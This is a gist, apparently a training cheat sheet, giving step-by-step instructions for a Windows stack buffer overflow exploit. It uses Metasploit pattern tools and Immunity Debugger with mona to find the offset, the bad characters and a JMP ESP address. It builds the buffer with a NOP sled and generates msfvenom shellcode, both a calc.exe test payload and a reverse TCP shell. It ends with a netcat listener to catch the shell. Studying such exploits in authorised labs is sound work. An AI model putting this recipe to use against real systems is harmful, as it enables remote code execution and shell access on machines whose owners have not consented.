
[source](https://gist.github.com/eliasrmalik/78f1f16cca36d55e2b52045b9dd29b0a)

* Run: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <APPEND_SIZE>

* Insert this unique string into your PoC script and run, copy the EIP number

* Run: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <APPEND_SIZE> -q <EIP>

* Take the offset figure and append to your buffer:
	"A" * <OFFSET_FIGURE> 
   
* Include  four bytes per below to confirm you have control of the ESP:
	"B" * 4

* Add trailing padding to the end of your buffer to uniform its size (Assuming a Python PoC): 
	buffer += "D" * (Initial_Fuzz_Value - len(buffer))

* Append bad characters to your PoC. A list of bad characters is  available here: ~~https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/~~ https://github.com/D4nk0St0rM/_d4nk0_ethical_hacking_/blob/main/buffer_overflow/badchars.md

* Right click the ESP in the Registers Tab and click "Follow in dump". Find and eliminate all the bad characters in your hex dump

* Run: "!mona modules"* in Immunity Debugger to find a suitable JMP ESP (Tell tale ones are those with ASLR and Rebase set to false). Once found: 

* Run: "!mona find -s "\xFF\xE4" -m <JMP_ESP's File/DLL name> (Ensure the selected file does not contain any bad characters in its address) 

* Add this JMP ESP to buffer. (Remember little endian if the target is x86 architecture!).

* Append NOP_SLEDs to the buffer:
	buffer += "\x90" * 25

* Generate and append calc.exe shellcode to the buffer:
	msfvenom -p windows/exec -b 'BADCHARS' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread

* Generate and append a reverse shell to the buffer:
	msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=1234 EXITFUNC=thread -f python -b "\xXX\xXX<BARCHARS>" (If this stage-less payload does not work, consider a staged payload)

* Your final buffer should be ordered: OFFSET + JMP_ESP + NOP_SLEDs + Shellcode + Trailing Padding

* Run: "nc -lvp 1234" and execute your payload on the target while listening
